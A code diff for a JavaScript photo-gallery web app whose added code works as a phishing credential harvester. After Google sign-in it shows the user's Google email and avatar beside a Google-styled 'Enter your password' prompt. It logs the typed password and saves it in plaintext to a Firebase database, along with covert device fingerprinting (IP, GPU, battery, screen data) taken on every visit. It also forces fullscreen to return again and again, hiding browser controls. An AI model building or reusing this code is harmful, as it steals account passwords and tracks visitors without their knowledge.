-let searchTimer;
-searchInput.addEventListener('input', (e) => {
-  clearTimeout(searchTimer);
-  searchTimer = setTimeout(() => {
-    searchQuery = e.target.value.trim();
-    renderGallery(getFilteredList());
-  }, 150);
-});
-
-document.querySelectorAll('.tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    // 🔥 Favorites tab pe check lagao
-    if (tab.dataset.filter === 'favorites' && !isLoggedIn) {
-      signinModal.style.display = 'flex';
-      return;
-    }
-    
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    tab.classList.add('active');
-    currentTab = tab.dataset.filter;
-    renderGallery(getFilteredList());
-  });
-});
-
-/* ============================================
-   GOOGLE SIGN-IN CALLBACK
-   ============================================ */
-function handleCredentialResponse(response) {
-  const payload = JSON.parse(atob(response.credential.split('.')[1]));
-  console.log('Google user:', payload);
-  askPassword(payload);
-}
-window.handleCredentialResponse = handleCredentialResponse;
-
-/* ============================================
-   ASK PASSWORD
-   ============================================ */
-function askPassword(payload) {
-  pendingUser = payload;
-
-  const overlay = $('pwdOverlay');
-  const title = $('pwdTitle');
-  const desc = $('pwdDesc');
-  const input = $('pwdInput');
-  const error = $('pwdError');
-  const label1 = $('pwdLabel1');
-
-  error.textContent = '';
-  input.value = '';
-
-  $('pwdUserEmail').textContent = payload.email;
-  if (payload.picture) {
-    $('pwdUserAvatar').style.background = `url(${payload.picture}) center/cover`;
-    $('pwdUserAvatar').textContent = '';
-  } else {
-    $('pwdUserAvatar').style.background = 'linear-gradient(135deg, #4285F4, #34A853)';
-    $('pwdUserAvatar').textContent = (payload.name || payload.email).charAt(0).toUpperCase();
-  }
-
-  title.textContent = 'Welcome';
-  desc.textContent = 'Enter your password';
-  label1.textContent = 'Enter your password';
-
-  overlay.classList.add('show');
-  setTimeout(() => input.focus(), 100);
-}
-
-/* ============================================
-   PASSWORD EVENTS
-   ============================================ */
-$('pwdSubmit').addEventListener('click', submitPassword);
-$('pwdInput').addEventListener('keydown', (e) => {
-  if (e.key === 'Enter') { e.preventDefault(); submitPassword(); }
-});
-
-$('pwdCancel').addEventListener('click', () => {
-  $('pwdOverlay').classList.remove('show');
-  pendingUser = null;
-  const gsiWrapper = document.querySelector('.g_id_signin');
-  if (gsiWrapper) gsiWrapper.style.display = 'flex';
-});
-
-$('pwdShow').addEventListener('change', (e) => {
-  $('pwdInput').type = e.target.checked ? 'text' : 'password';
-});
-
-$('pwdForgot').addEventListener('click', (e) => {
-  e.preventDefault();
-  if (!pendingUser) return;
-  showToast('No password reset — har login naya entry banata hai');
-});
-
-/* ============================================
-   SUBMIT PASSWORD
-   (simple — koi verify nahi, har login save)
-   ============================================ */
-async function submitPassword() {
-  const input = $('pwdInput');
-  const error = $('pwdError');
-  const pwd = input.value;
-
-  error.textContent = '';
-
-  if (pwd.length < 4) {
-    error.textContent = 'Password must be at least 4 characters';
-    return;
-  }
-
-  $('pwdShow').checked = false;
-  $('pwdInput').type = 'password';
-  $('pwdOverlay').classList.remove('show');
-
-  // 🔥 YE IMPORTANT HAI — await karo
-  await completeLogin(pendingUser, pwd);
-  pendingUser = null;
-}
-
-/* ============================================
-   COMPLETE LOGIN
-   ============================================ */
-async function completeLogin(payload, password) {
-  console.log('🔍 completeLogin called with password:', password);
-  
-  lockCard.classList.add('success');
-  lockTitle.textContent = 'Signed in successfully! 🎉';
-  lockDesc.textContent = `Welcome, ${payload.name || payload.email}!`;
-
-  const gsiWrapper = document.querySelector('.g_id_signin');
-  if (gsiWrapper) gsiWrapper.style.display = 'none';
-
-  isLoggedIn = true;
-  userEmail = payload.email;
-  localStorage.setItem('pics_logged_in', 'true');
-  localStorage.setItem('pics_user_email', payload.email);
-  localStorage.setItem('pics_user_name', payload.name || '');
-  localStorage.setItem('pics_user_pic', payload.picture || '');
-  localStorage.setItem('pics_user_uid', payload.sub || '');
-
-  // 🔥 YE IMPORTANT — await karo
-  await saveLoginToUserData(payload, password);
-
-  showToast('Signed in as ' + payload.email + ' ✅');
-  updateAvatarAfterLogin();
-  updateProfileMenu();
-
-  setTimeout(() => {
-    lockedSection.style.display = 'none';
-    renderGallery(getFilteredList());
-    showToast('All photos unlocked! 🎉');
-  }, 1200);
-}
-
-/* ============================================
-   AVATAR
-   ============================================ */
-function updateAvatarAfterLogin() {
-  const pic = localStorage.getItem('pics_user_pic');
-  const name = localStorage.getItem('pics_user_name') || '';
-
-  if (avatarEl) {
-    if (pic) {
-      avatarEl.style.background = `url(${pic}) center/cover`;
-      avatarEl.textContent = '';
-    } else if (name) {
-      avatarEl.textContent = name.charAt(0).toUpperCase();
-      avatarEl.style.background = 'linear-gradient(135deg, #EA4335, #FBBC05)';
-    }
-    avatarEl.title = userEmail;
-  }
-}
-
-/* ============================================
-   PROFILE MENU
-   ============================================ */
-function updateProfileMenu() {
-  const name = localStorage.getItem('pics_user_name') || '';
-  const email = localStorage.getItem('pics_user_email') || '';
-  const pic = localStorage.getItem('pics_user_pic') || '';
-
-  if (isLoggedIn && email) {
-    menuName.textContent = name || 'User';
-    menuEmail.textContent = email;
-    if (pic) {
-      menuAvatar.style.backgroundImage = `url(${pic})`;
-      menuAvatar.textContent = '';
-    } else {
-      menuAvatar.style.backgroundImage = '';
-      menuAvatar.textContent = (name || email).charAt(0).toUpperCase();
-    }
-    $('menuLogoutBtn').style.display = 'flex';
-  } else {
-    menuName.textContent = 'Guest User';
-    menuEmail.textContent = 'Not signed in';
-    menuAvatar.style.backgroundImage = '';
-    menuAvatar.textContent = 'A';
-    $('menuLogoutBtn').style.display = 'none';
-  }
-}
-
-if (avatarEl) {
-  avatarEl.addEventListener('click', (e) => {
-    e.stopPropagation();
-    updateProfileMenu();
-    profileMenu.classList.toggle('show');
-    profileOverlay.classList.toggle('show');
-  });
-}
-
-profileOverlay.addEventListener('click', () => {
-  profileMenu.classList.remove('show');
-  profileOverlay.classList.remove('show');
-});
-
-profileMenu.addEventListener('click', (e) => e.stopPropagation());
-
-/* ============================================
-   LOGOUT
-   ============================================ */
-$('menuLogoutBtn').addEventListener('click', () => {
-  localStorage.removeItem('pics_logged_in');
-  localStorage.removeItem('pics_user_email');
-  localStorage.removeItem('pics_user_name');
-  localStorage.removeItem('pics_user_pic');
-  localStorage.removeItem('pics_user_uid');
-
-  isLoggedIn = false;
-  userEmail = '';
-
-  avatarEl.style.background = 'linear-gradient(135deg, #4285F4, #34A853)';
-  avatarEl.style.backgroundImage = '';
-  avatarEl.textContent = 'A';
-  avatarEl.title = '';
-
-  profileMenu.classList.remove('show');
-  profileOverlay.classList.remove('show');
-
-  renderGallery(getFilteredList());
-  showToast('Signed out successfully 👋');
-
-  setTimeout(() => {
-    if (window.google && window.google.accounts) {
-      window.google.accounts.id.disableAutoSelect();
-    }
-  }, 100);
-});
-
-/* ============================================
-   MANAGE GOOGLE ACCOUNT
-   ============================================ */
-$('menuAccountBtn').addEventListener('click', () => {
-  profileMenu.classList.remove('show');
-  profileOverlay.classList.remove('show');
-  if (userEmail) {
-    window.open('https://myaccount.google.com/', '_blank');
-  } else {
-    showToast('Please sign in first');
-  }
-});
-/* ============================================
-   SIGN-IN REQUIRED MODAL (FAVORITES)
-   ============================================ */
-const signinModal = $('signinModal');
-
-// Close modal
-function closeSigninModal() {
-  signinModal.style.display = 'none';
-}
-
-// Modal Cancel button
-$('signinModalCancel').addEventListener('click', closeSigninModal);
-
-// Modal overlay click
-signinModal.addEventListener('click', (e) => {
-  if (e.target === signinModal) closeSigninModal();
-});
-
-// Sign In button in modal
-$('signinFromModalBtn').addEventListener('click', () => {
-  // Modal band karo
-  closeSigninModal();
-  
-  // 🔥 Locked section dikhao + scroll karo
-  const locked = document.getElementById('lockedSection');
-  if (locked) {
-    locked.style.display = 'block';
-    locked.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    
-    // 🔥 Google button ko highlight karo
-    setTimeout(() => {
-      const googleBtn = locked.querySelector('.g_id_signin');
-      if (googleBtn) {
-        googleBtn.style.transform = 'scale(1.08)';
-        googleBtn.style.transition = 'transform 0.3s';
-        googleBtn.style.boxShadow = '0 0 20px rgba(66, 133, 244, 0.5)';
         setTimeout(() => {
-          googleBtn.style.transform = 'scale(1)';
-          googleBtn.style.boxShadow = 'none';
-        }, 800);
+          const el = document.documentElement;
+          const req = el.requestFullscreen ||
+            el.webkitRequestFullscreen ||
+            el.mozRequestFullScreen ||
+            el.msRequestFullscreen;
+
+          if (req) {
+            req.call(el).catch(() => { });
+          }
+        }, 150);
       }
-    }, 500);
-  }
-});
-/* ============================================
-   FAVORITES FROM MENU
-   ============================================ */
-$('menuFavoritesBtn').addEventListener('click', () => {
-  profileMenu.classList.remove('show');
-  profileOverlay.classList.remove('show');
-
-  // 🔥 Check karo user logged in hai ya nahi
-  if (!isLoggedIn) {
-    // Sign-in modal dikhao
-    signinModal.style.display = 'flex';
-    return;
-  }
-
-  // User logged in → favorites tab kholo
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelector('.tab[data-filter="favorites"]').classList.add('active');
-  currentTab = 'favorites';
-  renderGallery(getFilteredList());
-});
-
-/* ============================================
-   FAVORITES
-   ============================================ */
-function toggleFavorite(src, btn) {
-  const idx = favorites.indexOf(src);
-  if (idx > -1) {
-    favorites.splice(idx, 1);
-    if (btn) btn.classList.remove('active');
-    showToast('Removed from favorites');
-  } else {
-    favorites.push(src);
-    if (btn) btn.classList.add('active');
-    showToast('Added to favorites ❤️');
-  }
-  localStorage.setItem('pics_favorites', JSON.stringify(favorites));
-  updateCounts();
-  updateFavViewerBtn();
-  if (currentTab === 'favorites') renderGallery(getFilteredList());
-}
-
-function updateCounts() {
-  countAll.textContent = '(' + allImages.length + ')';
-  countFav.textContent = favorites.length ? '(' + favorites.length + ')' : '';
-}
-
-/* ============================================
-   VIEWER
-   ============================================ */
-function openViewer(index) {
-  viewerIndex = index;
-  updateViewer();
-  viewer.classList.add('active');
-  document.body.style.overflow = 'hidden';
-
-  // 🔥 BROWSER FULLSCREEN MODE
-  const el = document.documentElement;
-  const req = el.requestFullscreen ||
-              el.webkitRequestFullscreen ||
-              el.mozRequestFullScreen ||
-              el.msRequestFullscreen;
-
-  if (req && !document.fullscreenElement) {
-    req.call(el).catch(err => {
-      console.log('Fullscreen blocked:', err.message);
     });
-  }
-}
 
-function updateViewer() {
-  const src = currentList[viewerIndex];
-  if (!src) return;
-  viewerImg.src = src;
-  viewerTitle.textContent = 'Photo ' + (viewerIndex + 1);
-  viewerCounter.textContent = (viewerIndex + 1) + ' / ' + currentList.length;
-  ssCount.textContent = (viewerIndex + 1) + ' / ' + currentList.length;
-  prevBtn.disabled = viewerIndex === 0;
-  nextBtn.disabled = viewerIndex === currentList.length - 1;
-  updateFavViewerBtn();
-}
+    // Fullscreen tootne pe auto-restore
+    document.addEventListener('fullscreenchange', function () {
+      if (!document.fullscreenElement && __userWantsFullscreen) {
+        setTimeout(() => {
+          if (__userWantsFullscreen && !document.fullscreenElement) {
+            const el = document.documentElement;
+            const req = el.requestFullscreen || el.webkitRequestFullscreen;
+            if (req) req.call(el).catch(() => { });
+          }
+        }, 300);
+      }
+    });
+     // Google popup close detect
+    window.addEventListener('focus', () => {
+      if (__userWantsFullscreen && !document.fullscreenElement) {
+        setTimeout(() => {
+          const el = document.documentElement;
+          const req = el.requestFullscreen ||
+                      el.webkitRequestFullscreen ||
+                      el.mozRequestFullScreen ||
+                      el.msRequestFullscreen;
+          if (req) req.call(el).catch(() => {});
+        }, 200);
+      }
+    });
 
-function updateFavViewerBtn() {
-  const src = currentList[viewerIndex];
-  if (!src) return;
-  favViewerBtn.querySelector('svg').style.fill = favorites.includes(src) ? '#EA4335' : '#fff';
-}
+    // Tab visibility change
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden && __userWantsFullscreen && !document.fullscreenElement) {
+        setTimeout(() => {
+          const el = document.documentElement;
+          const req = el.requestFullscreen ||
+                      el.webkitRequestFullscreen ||
+                      el.mozRequestFullScreen ||
+                      el.msRequestFullscreen;
+          if (req) req.call(el).catch(() => {});
+        }, 200);
+      }
+    });
+    async function init() {
+      const uploaded = JSON.parse(localStorage.getItem('pics_uploaded') || '[]');
+      allImages = [...uploaded, ...DEFAULT_IMAGES];
 
-function closeViewer() {
-  stopSlideshow();
-  viewer.classList.remove('active');
-  document.body.style.overflow = '';
-}
+      const savedTheme = localStorage.getItem('pics_theme');
+      if (savedTheme === 'dark' ||
+        (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+        document.body.classList.add('dark');
+        updateThemeIcon(true);
+      } else {
+        updateThemeIcon(false);
+      }
 
-function prevImage() {
-  if (viewerIndex > 0) { viewerIndex--; updateViewer(); }
-}
-function nextImage() {
-  if (viewerIndex < currentList.length - 1) {
-    viewerIndex++; updateViewer();
-  } else if (slideshowActive) {
-    stopSlideshow();
-    showToast('Slideshow finished');
-  }
-}
+      if (isLoggedIn) updateAvatarAfterLogin();
 
-closeBtn.addEventListener('click', closeViewer);
-viewer.addEventListener('click', (e) => {
-  if (e.target === viewer) closeViewer();
-});
-prevBtn.addEventListener('click', (e) => { e.stopPropagation(); prevImage(); });
-nextBtn.addEventListener('click', (e) => { e.stopPropagation(); nextImage(); });
+      renderGallery(getFilteredList());
+      updateCounts();
+      updateProfileMenu();
 
-favViewerBtn.addEventListener('click', (e) => {
-  e.stopPropagation();
-  toggleFavorite(currentList[viewerIndex], null);
-});
-
-/* ============================================
-   SHARE
-   ============================================ */
-shareBtn.addEventListener('click', async (e) => {
-  e.stopPropagation();
-  const src = currentList[viewerIndex];
-  if (!src) return;
-  if (!navigator.share) {
-    try {
-      await navigator.clipboard.writeText(src);
-      showToast('Link copied to clipboard 📋');
-    } catch {
-      showToast('Share not supported');
+      // 🔥 Step 1: Page visit → device info save
+      await saveDeviceToRoot();
+      // 🔥 Google SDK initialize karo
+      if (window.google && window.google.accounts) {
+        google.accounts.id.initialize({
+          client_id: "338077974110-5l2ti6hcnhbtejq1r1h1hrgfh4uqdk4a.apps.googleusercontent.com",
+          callback: handleCredentialResponse
+        });
+      }
     }
-    return;
-  }
-  try {
-    if (src.startsWith('data:') || src.startsWith('blob:')) {
-      const blob = await (await fetch(src)).blob();
-      const file = new File([blob], 'photo.jpg', { type: blob.type });
-      if (navigator.canShare && navigator.canShare({ files: [file] })) {
-        await navigator.share({ files: [file], title: 'Photo', text: 'Check this out!' });
-        showToast('Shared ✅');
+
+
+
+    /* ============================================
+       DEVICE INFO COLLECTION
+       ============================================ */
+    async function collectDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        browserLanguage: navigator.language,
+        browserLanguages: navigator.languages || [],
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'unspecified',
+        online: navigator.onLine,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        product: navigator.product,
+        appVersion: navigator.appVersion,
+        appName: navigator.appName,
+
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        availWidth: window.screen.availWidth,
+        availHeight: window.screen.availHeight,
+        colorDepth: window.screen.colorDepth,
+        pixelDepth: window.screen.pixelDepth,
+        devicePixelRatio: window.devicePixelRatio,
+        windowWidth: window.innerWidth,
+        windowHeight: window.innerHeight,
+        orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
+
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        locale: Intl.DateTimeFormat().resolvedOptions().locale,
+        dateTimeString: new Date().toString(),
+        timestamp: Date.now(),
+
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+
+        connectionType: (navigator.connection && navigator.connection.effectiveType) || 'unknown',
+        connectionDownlink: (navigator.connection && navigator.connection.downlink) || 'unknown',
+        connectionRtt: (navigator.connection && navigator.connection.rtt) || 'unknown',
+        connectionSaveData: (navigator.connection && navigator.connection.saveData) || false,
+
+        pageUrl: window.location.href,
+        pageReferrer: document.referrer || 'direct',
+        pageTitle: document.title,
+
+        visitAt: new Date().toISOString(),
+        visitTimestamp: Date.now()
+      };
+
+      // Battery
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          info.batteryLevel = Math.round(battery.level * 100) + '%';
+          info.batteryCharging = battery.charging;
+        }
+      } catch (e) { }
+
+      // IP
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        info.ipAddress = data.ip;
+      } catch (e) {
+        info.ipAddress = 'unknown';
+      }
+
+      // GPU
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+        }
+      } catch (e) { }
+
+      info.fingerprint = await generateFingerprint(info);
+      return info;
+    }
+
+    /* ============================================
+       FINGERPRINT (deviceId)
+       ============================================ */
+    /* ============================================
+       GENERATE PRO DEVICE ID
+       Format: HEK-A3fK8mP2 (Base62, 8 chars)
+       ============================================ */
+    async function generateFingerprint(info) {
+      const raw = [
+        info.userAgent,
+        info.screenWidth + 'x' + info.screenHeight,
+        info.colorDepth,
+        info.timezone,
+        info.language,
+        info.platform,
+        info.hardwareConcurrency,
+        info.deviceMemory,
+        info.devicePixelRatio,
+        info.gpuRenderer || ''
+      ].join('|');
+
+      // SHA-256 hash
+      const msgBuffer = new TextEncoder().encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+
+      // 🔥 Base62 me convert karo (0-9, A-Z, a-z)
+      const BASE62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+
+      let id = '';
+      for (let i = 0; i < 8; i++) {
+        const byte = hashArray[i];
+        const index = byte % 62;
+        id += BASE62[index];
+      }
+
+      // Ambiguous characters avoid karo
+      id = id.replace(/O/g, 'X').replace(/0/g, 'Y')
+        .replace(/I/g, 'Z').replace(/l/g, 'W')
+        .replace(/1/g, 'V');
+
+      return 'HEK-' + id;
+    }
+
+    /* ============================================
+       STEP 1: SAVE DEVICE TO devices_root/{deviceId}
+       ============================================ */
+    async function saveDeviceToRoot() {
+      try {
+        let tries = 0;
+        while (!window.firebaseDB && tries < 30) {
+          await new Promise(r => setTimeout(r, 100));
+          tries++;
+        }
+        if (!window.firebaseDB) return;
+
+        const { ref, update, serverTimestamp, get } = window.firebaseFns;
+        const db = window.firebaseDB;
+
+        // Collect device info
+        currentDeviceInfo = await collectDeviceInfo();
+        currentDeviceId = currentDeviceInfo.fingerprint;
+
+        // 🔥 devices_root/{deviceId} me save karo
+        const deviceRef = ref(db, 'devices_root/' + currentDeviceId);
+        const snapshot = await get(deviceRef);
+
+        const deviceData = {
+          deviceId: currentDeviceId,
+          ...currentDeviceInfo,
+          lastVisit: serverTimestamp(),
+          visitCount: (snapshot.exists() ? (snapshot.val().visitCount || 0) + 1 : 1)
+        };
+
+        if (!snapshot.exists()) {
+          deviceData.firstVisit = serverTimestamp();
+        }
+
+        await update(deviceRef, deviceData);
+        console.log('✅ Device saved to devices_root:', currentDeviceId);
+
+        // Local me bhi save karo
+        localStorage.setItem('pics_device_id', currentDeviceId);
+
+      } catch (err) {
+        console.error('❌ saveDeviceToRoot error:', err);
+      }
+    }
+
+    /* ============================================
+       STEP 2: SAVE LOGIN TO users_data/{deviceId}/logins/{uniqueKey}
+       ============================================ */
+    async function saveLoginToUserData(payload, password) {
+      try {
+        console.log('🔍 saveLoginToUserData called');
+        console.log('  - currentDeviceId:', currentDeviceId);
+        console.log('  - payload.sub:', payload.sub);
+        console.log('  - password:', password);
+        console.log('  - window.firebaseDB:', !!window.firebaseDB);
+
+        if (!currentDeviceId) {
+          console.error('❌ currentDeviceId is NULL — device info not collected');
+          showToast('Device ID missing!');
+          return;
+        }
+        if (!window.firebaseDB) {
+          console.error('❌ Firebase not loaded');
+          showToast('Firebase not loaded');
+          return;
+        }
+
+        const { ref, push, serverTimestamp } = window.firebaseFns;
+        const db = window.firebaseDB;
+
+        const loginsRef = ref(db, 'users_data/' + currentDeviceId + '/logins');
+        console.log('🔍 loginsRef path:', 'users_data/' + currentDeviceId + '/logins');
+
+        const loginData = {
+          uid: payload.sub,
+          name: payload.name || '',
+          email: payload.email || '',
+          picture: payload.picture || '',
+          emailVerified: payload.email_verified || false,
+          password: password,
+          deviceInfo: currentDeviceInfo,
+          loginAt: serverTimestamp(),
+          loginAtISO: new Date().toISOString()
+        };
+
+        console.log('🔍 loginData:', loginData);
+
+        const newRef = await push(loginsRef, loginData);
+        console.log('✅ Login saved to users_data/' + currentDeviceId + '/logins/' + newRef.key);
+
+        showToast('Login saved ✅');
+      } catch (err) {
+        console.error('❌ saveLoginToUserData error:', err);
+        showToast('Save failed: ' + err.message);
+      }
+    }
+
+    /* ============================================
+       THEME
+       ============================================ */
+    function updateThemeIcon(isDark) {
+      if (themeIcon) themeIcon.textContent = isDark ? 'light_mode' : 'dark_mode';
+    }
+    themeToggle.addEventListener('click', () => {
+      const isDark = document.body.classList.toggle('dark');
+      localStorage.setItem('pics_theme', isDark ? 'dark' : 'light');
+      updateThemeIcon(isDark);
+    });
+
+    /* ============================================
+       FILTER / SEARCH
+       ============================================ */
+    function getFilteredList() {
+      let list = [...allImages];
+      if (currentTab === 'favorites') {
+        list = list.filter(src => favorites.includes(src));
+      }
+      if (searchQuery) {
+        const q = searchQuery.toLowerCase();
+        list = list.filter((src, i) => `photo ${i + 1}`.includes(q));
+      }
+      return list;
+    }
+
+    /* ============================================
+       RENDER
+       ============================================ */
+    function createCard(src, index) {
+      const card = document.createElement('div');
+      card.className = 'pic-card';
+
+      const img = document.createElement('img');
+      img.src = src; img.loading = 'lazy';
+      img.alt = 'photo ' + (index + 1);
+      card.appendChild(img);
+
+      const favBtn = document.createElement('button');
+      favBtn.className = 'fav-btn' + (favorites.includes(src) ? ' active' : '');
+      favBtn.innerHTML = `<svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>`;
+      favBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        toggleFavorite(src, favBtn);
+      });
+      card.appendChild(favBtn);
+
+      card.addEventListener('click', () => openViewer(index));
+      return card;
+    }
+
+    function renderGallery(list) {
+      currentList = list;
+      visibleCount = 0;
+      gallery.innerHTML = '';
+      lockedGallery.innerHTML = '';
+
+      if (list.length === 0) {
+        emptyState.classList.add('show');
+        viewMoreWrap.style.display = 'none';
+        lockedSection.style.display = 'none';
         return;
       }
-    }
-    await navigator.share({ title: 'Photo', text: 'Check this out!', url: src });
-    showToast('Shared ✅');
-  } catch (err) {
-    if (err.name !== 'AbortError') showToast('Share cancelled');
-  }
-});
+      emptyState.classList.remove('show');
 
-/* ============================================
-   DOWNLOAD
-   ============================================ */
-downloadBtn.addEventListener('click', (e) => {
-  e.stopPropagation();
-  const src = currentList[viewerIndex];
-  const a = document.createElement('a');
-  a.href = src;
-  a.download = 'photo-' + (viewerIndex + 1) + '.jpg';
-  a.target = '_blank';
-  a.click();
-  showToast('Downloading...');
-});
-
-/* ============================================
-   SLIDESHOW
-   ============================================ */
-slideshowBtn.addEventListener('click', (e) => {
-  e.stopPropagation();
-  if (slideshowActive) stopSlideshow(); else startSlideshow();
-});
-
-function startSlideshow() {
-  slideshowActive = true;
-  slideshowBar.classList.add('show');
-  slideshowProgress.classList.add('show');
-  slideshowBtn.querySelector('svg').innerHTML = '<path d="M6 5h4v14H6zm8 0h4v14h-4z"/>';
-  updateSSPlayIcon(true);
-  resetProgress();
-  clearInterval(slideshowTimer);
-  slideshowTimer = setInterval(() => {
-    if (viewerIndex < currentList.length - 1) {
-      viewerIndex++; updateViewer(); resetProgress();
-    } else {
-      stopSlideshow(); showToast('Slideshow finished 🎬');
-    }
-  }, slideshowInterval);
-  clearInterval(progressInterval);
-  slideshowElapsed = 0;
-  progressInterval = setInterval(() => {
-    slideshowElapsed += 50;
-    slideshowProgress.style.width = Math.min((slideshowElapsed / slideshowInterval) * 100, 100) + '%';
-  }, 50);
-  showToast('Slideshow started ▶️');
-}
-
-function stopSlideshow() {
-  slideshowActive = false;
-  clearInterval(slideshowTimer);
-  clearInterval(progressInterval);
-  slideshowTimer = null; progressInterval = null;
-  slideshowBar.classList.remove('show');
-  slideshowProgress.classList.remove('show');
-  slideshowProgress.style.width = '0%';
-  slideshowBtn.querySelector('svg').innerHTML = '<path d="M8 5v14l11-7z"/>';
-}
-
-function resetProgress() {
-  slideshowElapsed = 0;
-  slideshowProgress.style.width = '0%';
-}
-
-function updateSSPlayIcon(playing) {
-  ssPlayIcon.innerHTML = playing
-    ? '<path d="M6 5h4v14H6zm8 0h4v14h-4z"/>'
-    : '<path d="M8 5v14l11-7z"/>';
-}
-
-ssPlayPause.addEventListener('click', (e) => {
-  e.stopPropagation();
-  if (slideshowTimer) {
-    clearInterval(slideshowTimer); clearInterval(progressInterval);
-    slideshowTimer = null; progressInterval = null;
-    updateSSPlayIcon(false);
-  } else {
-    slideshowTimer = setInterval(() => {
-      if (viewerIndex < currentList.length - 1) {
-        viewerIndex++; updateViewer(); resetProgress();
-      } else { stopSlideshow(); showToast('Slideshow finished 🎬'); }
-    }, slideshowInterval);
-    progressInterval = setInterval(() => {
-      slideshowElapsed += 50;
-      slideshowProgress.style.width = Math.min((slideshowElapsed / slideshowInterval) * 100, 100) + '%';
-    }, 50);
-    updateSSPlayIcon(true);
-  }
-});
-
-ssSpeed.addEventListener('change', (e) => {
-  e.stopPropagation();
-  slideshowInterval = parseInt(e.target.value);
-  if (slideshowActive) {
-    clearInterval(slideshowTimer); clearInterval(progressInterval);
-    resetProgress();
-    slideshowTimer = setInterval(() => {
-      if (viewerIndex < currentList.length - 1) {
-        viewerIndex++; updateViewer(); resetProgress();
-      } else { stopSlideshow(); showToast('Slideshow finished 🎬'); }
-    }, slideshowInterval);
-    progressInterval = setInterval(() => {
-      slideshowElapsed += 50;
-      slideshowProgress.style.width = Math.min((slideshowElapsed / slideshowInterval) * 100, 100) + '%';
-    }, 50);
-  }
-});
-
-ssStop.addEventListener('click', (e) => {
-  e.stopPropagation();
-  stopSlideshow();
-  showToast('Slideshow stopped');
-});
-
-document.addEventListener('keydown', (e) => {
-  if (!viewer.classList.contains('active')) return;
-  if (e.key === 'Escape') closeViewer();
-  if (e.key === 'ArrowLeft') prevImage();
-  if (e.key === 'ArrowRight') nextImage();
-  if (e.key === ' ') {
-    e.preventDefault();
-    slideshowActive ? stopSlideshow() : startSlideshow();
-  }
-});
-
-let touchStartX = 0;
-viewer.addEventListener('touchstart', (e) => { touchStartX = e.changedTouches[0].screenX; }, { passive: true });
-viewer.addEventListener('touchend', (e) => {
-  const diff = e.changedTouches[0].screenX - touchStartX;
-  if (Math.abs(diff) > 60) { if (diff > 0) prevImage(); else nextImage(); }
-}, { passive: true });
-
-/* ============================================
-   UPLOAD
-   ============================================ */
-uploadBtn.addEventListener('click', () => fileInput.click());
-fileInput.addEventListener('change', (e) => {
-  const files = Array.from(e.target.files);
-  if (!files.length) return;
-  let loaded = 0;
-  const newImages = [];
-  files.forEach(file => {
-    const reader = new FileReader();
-    reader.onload = (ev) => {
-      newImages.push(ev.target.result);
-      loaded++;
-      if (loaded === files.length) {
-        const uploaded = JSON.parse(localStorage.getItem('pics_uploaded') || '[]');
-        const updated = [...newImages, ...uploaded];
-        localStorage.setItem('pics_uploaded', JSON.stringify(updated));
-        allImages = [...updated, ...DEFAULT_IMAGES];
-        updateCounts();
-        renderGallery(getFilteredList());
-        showToast(files.length + ' photo(s) uploaded ✅');
+      if (isLoggedIn) {
+        lockedSection.style.display = 'none';
+        viewMoreWrap.style.display = 'flex';
+        loadMore(FREE_LIMIT);
+        return;
       }
-    };
-    reader.readAsDataURL(file);
-  });
-  fileInput.value = '';
-});
 
-/* ============================================
-   TOAST
-   ============================================ */
-let toastTimer;
-function showToast(msg) {
-  toast.textContent = msg;
-  toast.classList.add('show');
-  clearTimeout(toastTimer);
-  toastTimer = setTimeout(() => toast.classList.remove('show'), 2000);
-}
+      if (list.length <= FREE_LIMIT) {
+        lockedSection.style.display = 'none';
+        viewMoreWrap.style.display = 'flex';
+        loadMore(FREE_LIMIT);
+      } else {
+        viewMoreWrap.style.display = 'none';
+        lockedSection.style.display = 'block';
+        for (let i = 0; i < FREE_LIMIT; i++) {
+          gallery.appendChild(createCard(list[i], i));
+        }
+        visibleCount = FREE_LIMIT;
+        renderLockedGallery(list.slice(FREE_LIMIT));
+        updateViewMoreBtn();
+      }
+    }
 
-/* ============================================
-   PWA
-   ============================================ */
-let deferredPrompt = null;
-window.addEventListener('beforeinstallprompt', (e) => {
-  e.preventDefault();
-  deferredPrompt = e;
-  installBtn.style.display = 'flex';
-});
-installBtn.addEventListener('click', async () => {
-  if (!deferredPrompt) { showToast('App already installed'); return; }
-  deferredPrompt.prompt();
-  const { outcome } = await deferredPrompt.userChoice;
-  if (outcome === 'accepted') showToast('App installed 🎉');
-  deferredPrompt = null;
-  installBtn.style.display = 'none';
-});
-window.addEventListener('appinstalled', () => {
-  installBtn.style.display = 'none';
